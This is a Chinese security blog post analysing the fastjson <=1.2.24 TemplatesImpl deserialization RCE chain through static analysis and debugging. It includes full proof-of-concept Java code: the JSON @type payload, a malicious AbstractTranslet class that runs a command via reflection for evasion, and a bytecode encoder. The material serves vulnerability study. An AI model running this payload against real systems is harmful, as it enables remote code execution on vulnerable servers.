前言：
===

最近在学习java反序列化相关漏洞，那fastjson肯定是经典，fastjson可以说是养活了一代“安全人”；  
分析下fastjson一个比较久远的反序列化漏洞：  
fastjson&lt;=1.2.24 TemplatesImpl调用链原理以及调试过程。

漏洞触发总结
======

**com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl**类中存在java 动态编程思想的实现，这里利用的是java动态编程里面的**Javassit**动态编程方式，简单说就是：  
`传统的java代码编译是编译生成class字节码文件，JVM会将这些字节码转换成机器码并执行，这个过程是在程序运行的时候进行的；但在该Javassit模式下提供了一些方法可以使我们手工编写的字节码传入JVM中执行；`  
TemplatesImpl中`_bytecodes`属性中存放着手工编写的字节码，并在其调用`getTransletInstance()`方法时会加载该字节码到JVM中获取到字节码中的类并调用newInstance()创建该类的实例，如果`_bytecodes`为可控的并且能找到一条触发getTransletInstance()方法的调用链，那么rce不就有了嘛。  
该巧不巧，fastjson正好能提供上面两个条件（`_bytecodes`为可控的并且能找到一条触发getTransletInstance()方法的调用链）。  
1、首先fastjson在反序列化将json还原成对象的时候，可以使用**\\@type**来指定类的，这里指定为`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类，并可以构造相关属性的内容，所以在这里就可以将恶意类字节码对象提前准备好传入`_bytecodes`属性中  
2、在fastjson反序列化过程中会调用JavaBeanDeserialze类的deserialze方法并在其中通过反射方式调用传入属性的get、set方法（这里是有条件的下文中会提到），并且在其调用属性`_outputProperties`的get方法：`getOutputProPerties()`方法中调用了`newTransformer（）`方法从而触发`getTransletInstance()`方法也就导致了上述的rce。

接下来从两个方面开展分析调试工作：  
1、静态分析  
2、动态调试

调用链分析
=====

静态分析
----

该漏洞利用这个类为：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

反过来分析这条调用链，思路比较明确：  
1、首先我们找到触发执行恶意代码的地方，为：TemplatesImpl对象的`getTransletInstance()`方法中通过调用其属性`_class` 的newInstance()方法创建了一个实例化类，而该类为恶意类，从而执行了其静态方法和构造方法中的恶意代码：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-65c0c302b99a27d0a4e27ff674f06fa5b091195a.png)  
这里有2个小细节：  
(1)、通过newInstance()方法创建实例化的时候进行了强制类型转换`AbstractTranslet`，所以我们构造的恶意类要继承`AbstractTranslet`类。  
(2)、TemplatesImpl对象的`_name`属性不能为空，不然直接return null了，所以构造的payload中要设置`_name`变量。  
2、那么TemplaresImpl对象的`_class`属性是哪来的，又如何构造将其设置为想要的恶意类Class呢？  
属性：`_bytecodes`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-06e7e4041ac0cea0337882513c323a2e4abda8dc.png)  
在TemplatesImpl类的`defineTransletClasses（）`方法中：调用了ClassLoad的defineClass方法将`_bytecodes`字节码转换成java.lang.class对象并赋值到其`_class`属性中。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e9ae39077cde9dc26a2d1985ec62c1ddca6d1741.png)

3、那么`_bytecodes`的值又是从哪来的呢？什么地方会吊用TemplatesImpl类的`defineTransletClasses（）`方法呢？

1)、正好该类的getTransletInstance()方法中就调用了`defineTransletClasses（）`方法，然后才去执行newInstance实例化操作的。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b7a0aa5143363d74238d7924382768296b8f2748.png)  
defineTransletClasses()

2)、当解决了上面第一个问题的时候，1、&gt;什么时候会调用TemplatesImpl的getTransletInstance()方法？2、&gt;关注点聚焦于`_bytecodes`属性如何设置为我们恶意对象class的字节码？

1、&gt;在TemplatesImpl类中的newTransformer()方法中调用了`getTransletInstance()`方法:  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-bc5545865382a48e57d17c1a3c54033379a46319.png)  
而newTransformer()方法又被TemplatesImpl类里面的` getOutputProperties()`方法调用：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b769ea6180602b1989df82ad6cba16a1ec7fd1c2.png)  
那什么时候会调用getOutputProperties()方法呢？  
**此时回想以下我们fastjson在反序列化的时候的特殊性：**  
fastjson反序列化将json还原成对象的时候，会触发其对象的成员属性的set方法，以及部分成员属性的get方法，get方法的触发条件是：

```php
只存在getter方法，无settet方法。  
方法名称长度大于4。
非静态方法。
方法名以get开头，且第四个字符为大写字母。
方法不用传入参数。
方法的返回值继承自 Collection、Map、AtomicBoolean、AtomicInteger 和AtomicLong的其中一个。
```

而上文提到的`getOutputProperties()`方法返回对象为Properties对象，该对象继承HashTable，而HashTable实现了Map接口。符合条件。所以payload中要设置`_outputProperites`就会触发调用链。

2、&gt;在payload中设置`_bytecodes`为恶意类class文件的字节码base64编码文件。

### 静态分析最后一个大问题

TemplateImapl中的只有属性变量`_outputProperties`没有属性`outputProperties`，所以调用的方法应该是`get_outputProperties`，那怎么办呢？

fastjson中反序列化的时候，会调用javabeanDeserialze类里面的deserialze（）方法，其中会调用`parseField（）`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-24b22a53d610d481ba8b2997c8d589a1d552ca59.png)  
在parseField()方法里面调用了自身类里面的`SmartMatch()`方法  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-939f81babb144d5c737f06c9fd7741d306e36296.png)  
该方法里面会对payload传入的属性进行一些操作，其中包括：发现以`_`开头的Filed（属性方法），会将`_`干掉。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-72d7e6a0e44745ecd0f9538fa0b7c8145c36c364.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-9adddf2395e664851445a8a4437a5efb1aaad53b.png)  
所以这个问题就解决了！！！

动态调试：
-----

### 代码：

#### 漏洞触发测试类：

```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.Feature;  

public class fastjson124 {  
    public static void main(String[] args) {  

        EvalClastoBytes evalClastoBytes = new EvalClastoBytes();  
 String NASTY_CLASS="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";  
 String evilCode = evalClastoBytes.Starts(EvalClassforfastjsonTemplateImpl.class);  
 String payload2 = "{\"@type\":\"" + NASTY_CLASS +  
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }}";  
 /*  
 TemplatesImpl调用链  
 是否支持此调用链的关键就是在调用fastjson还原json为对象的时候带上Feature.SupportNonPublicField这个属性，因爲payload中的_bytecodes、_name屬性為私有屬性。 
 Feature.SupportNonPublicField这个属性在1.2.22版本才引入的，在1.2.25版本就被修复  
 */ JSON.parseObject(payload2,Object.class, Feature.SupportNonPublicField);  
 }  
}

```

#### 恶意类：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
import java.lang.reflect.Method;  

public class EvalClassforfastjsonTemplateImpl extends AbstractTranslet {  

    @Override  
 public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  

    }  

    @Override  
 public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  

    }  
    public EvalClassforfastjsonTemplateImpl() throws Exception{  
//
//      Runtime.getRuntime().exec("calc");  

//反射调用Runtime.getRuntime().exec("calc")执行命令,初级免杀  
 Class cls = Class.forName("java.lang.Runtime");  
 Method method = cls.getMethod("getRuntime",null);  
 Object obs = method.invoke(null,null);  
 Method method1 = obs.getClass().getMethod("exec",String.class);  
 method1.invoke(obs,"calc");  
 }  

    public static void main(String[] args) throws Exception{  
        EvalClassforfastjsonTemplateImpl evalClassforfastjsonTemplate = new EvalClassforfastjsonTemplateImpl();  
 }  
}
```

#### “提取恶意类字节码”类

```java

import com.sun.org.apache.bcel.internal.Repository;  
import java.util.Base64;  

public class EvalClastoBytes {  
    /*  
 根据恶意类获取恶意类字节码的base64编码  
 */ public String Starts(Class<EvalClassforfastjsonTemplateImpl> Evalclass){  
        return Base64.getEncoder().encodeToString(Repository.lookupClass(Evalclass).getBytes());  
 }  

    public static void main(String[] args) throws Exception{  
// 测试代码  
 EvalClastoBytes evalClastoBytes = new EvalClastoBytes();  
 String xx = evalClastoBytes.Starts(EvalClassforfastjsonTemplateImpl.class);  
 System.out.println(xx);  
 }  
}

```

### 结合上面代码和相关源码在几个关键点打上断点：

jdk：1.8.031  
1、fastjson调用`parseObject()`方法处:  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-738754ea42559034ede892a96310472a33a512f4.png)  
2、反序列化时触发JavaBeanDeserialze类的`deserialze()`方法处  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5f0908889552ff89eca43c9a6b3bd400698844b4.png)  
3、JavaBeanDeserialze类的`deserialze()`方法里面调用`parseFiled()`方法处  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-103953acc2f4e96da88c8933b94129d4c83ada21.png)  
4、parceFiled()方法中调用`smartMatch()`方法处  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5054935a56f693012a47d614b309f640594422fb.png)  
5、TemplatesImpl类中调用getOutputProperties（）方法并在其中调用newTransformer()方法处：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0bcfd1b8f29a0e83845f4741ef4acdebfa0904c1.png)  
6、newTransformer()方法中调用getTransletInstance()方法处  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c7db7b6da23a73fd2daf74b53fa38ca9aeeca2f5.png)  
7、getTransletInstace()方法中触发defineTransletClasses()方法和使用newInstance()获取恶意类实例对象的地方  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3ad7114ecc845968ea70dfaa3b4a48a1b0f9c919.png)

8、defineTransletClasses（）方法中使用defineClass将payload里面`_bytecodes`属性（恶意字节码）加载到内存中，并将获得的恶意类对象的赋值给`_class`属性。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3eacb05822763150b0da8b10f5bbf73c2d1fdae2.png)  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-bece1b816c83a8741e383fc4b43ff1053b88c574.png)

### 调试过程

1、fastjson反序列化触发JavaBeanDeserialze类的deserialze()方法：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c25e0a7c4fd9b33995b33ce525e75a6529f47545.png)  
2、在其deserialze()方法中会循环调用parseField(）对每个属性进行格式转换，但其处理的key为`_outputProperties`时  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f963b7de9882cebac0f468a72f83c61be55771ec.png)  
3、其parseField()中会调用smartMatch()方法，并将`_outputProperties`作为key传入：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f11f92983a95f771d4731881631938d8f7273b94.png)  
4、和在静态中分析的一样，在其smartMatch()方法中在对其格式进行处理的时候会调用替换函数将`key`中的下划线干掉了,变成`outputProperties`赋值给key2：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c9943f0705258d09abfd328bac7930037c7f12e2.png)  
5、并在后续调用getFiledDeserialzer（）方法时传入的参数为key2  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e663de45d22525aae67fcb604d58d9488e9b440a.png)  
6、跟进到其在反序列化过程中利用反射调用属性的set、get方法（这里并不是都调用，具体在上面原理剖析的时候提到了）从而还原其对象的时候：这里接着上面对`outputProperties`属性的处理进行跟进发现调用其getOutputProperties（）方法，并在该方法从调用了newTransformer()方法：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-fe83075d97ce4844543984e82b2f94a4c3efe601.png)  
此时的调用链是：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-9ec5baec4fe52cc5766b5f8909d944fc6370584b.png)  
7、跟进newTransformer()方法,在其中调用了getTransletInstance()方法：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-15ae3da7793dfc5b966837ba61c39e4687fb799c.png)  
8、跟进getTransletInstance()方法：里面简单的对`_class`和`_name`做了一个判断：  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d934f25af2cfa1a2896a9a4b802f1eb30be7b325.png)  
（1、`_name`属性要不为空，不然直接return null了，所以在payload中对其`_name`属性进行了定义，并传入值。  
（2、`_class`属性要为空，才能使其执行`defineTransletClasses()`方法，不妨跟进下该方法：在该方法中，当`_bytecodes`不为空的时候，会调用TransletClassLoad的defineClass()方法加载位于`_bytecodes`中的恶意类字节码到内存，并将返回的恶意类赋值`_class`属性  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-93979c38c3e6463e6cbb9c486ac440782cc25925.png)  
9、回到getTransletInstance()方法中，再执行了`defineTransletClasses()`方法方法之后，紧接着就是调用newInstance()方法实例化了刚刚写入的恶意类对象，从而触发了恶意类对象里面静态模块或者构造函数里面的恶意代码的执行！  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-c12350683a79a0817f014b51d251ba496bdf81f4.png)  
重复下上面有提到的一个细节问题：恶意类要继承AbstractTranslet类，原因就是这里在实例化的时候源码中对其进行了强制类型转换，  
动态调试工作就到此结束了！最后的调用链如下:  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ae3180e5a902ad292fa34556031561ae51e6d435.png)

payload的问题：
-----------

问：细心的师傅最开始复现的时候发现了一个问题，网上有很多TemplatesImpl调用链的poc，为什么poc中有些属性”可有可无“，并不会影响触发的调用链条以及造成任意代码执行，那poc中为啥要把这些”可有可无“的属性加上去呢？  
如下是jdk8.0\_31中测试可用的poc:

```php
String payload2 = "{\"@type\":\"" + NASTY_CLASS +  
        "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }}";
```

会发现只要有触发调用链必备的三个属性（上文分析中提到过`_bytecodes`和`_name`和`_outputProperties`）就能造成rce；

那网上常见poc中的`_tfactory`、`_transletIndex`、`_auxClasses`属性的作用是什么呢，真的是可有可无吗？

```java
String payload2 = "{\"@type\":\"" + NASTY_CLASS +  
"\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_transletIndex\":0,\"_auxClasses\":{ },\"_outputProperties\":{ }}";
```

答：那必然不会是可有可无，在参考了xxlegend师傅的一篇[文章](http://xxlegend.com/2018/01/25/2017%E5%B9%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A/)  
找到原因：设置这些属性简单总结就是说，增加了poc的兼容性，拿`_tfactory`举例，其在TemplatesImpl类里面既没有set也没有get方法，如果payload中没有设置`_tfactory`属性，在某些jdk版本中在defineTransletClasses()用到会引用\_tfactory属性但是找不到从而导致异常退出，调用链就断了，而如果在poc中写入该属性，fastjson会调用其无参构造函数生成一个`_tfactory`对象；至于具体哪些jdk版本存在差异化，有兴趣的师傅们可以研究研究。

总结
==

常见初代fastjson反序列化漏洞的利用方式有三种，TemplatesImpl是其中一种，也是条件要求最苛刻的一种(需要在反序列化的时候传入SupportNonPublicFiled支持对私有变量的处理)，其实战价值不大，但是学习该链的原理是十分有意义的，不仅使我对fastjson反序列化的运作机制更加深刻了,其次是这条调用链和cc4是有紧密关联的（原理一样大同小异），还有就是对代码漏洞挖掘的思维有了更多理解。好家伙一举三得呀！

最后想简单聊聊fastjson，从JdbcRowSetImpl到TemplatesImpl，fastjson这两条利用链的核心是：fastjson反序列化当使用**\\@type**指定类的时候，在反序列化还原json为对象的过程中会调用反射调用其属性的set、get方法\*（不是全调用，分析情况，上文有提及），从而导致rce！后续的话会继续写些fastjson&gt;1.2.24版本的补丁情况以及绕过方式的相关文章

常见初代fastjson反序列化漏洞的利用方式有三种，最后一种是针对不能出网使用的，记得没错的话应该是bcel方式，也是非常值得去学习的，bcel这个编码技术是常见的jsp免杀手段之一。

参考文章：
=====

<http://www.52bug.cn/hkjs/4686.html>  
<http://xxlegend.com/>  
<https://samny.blog.csdn.net/article/details/106160182>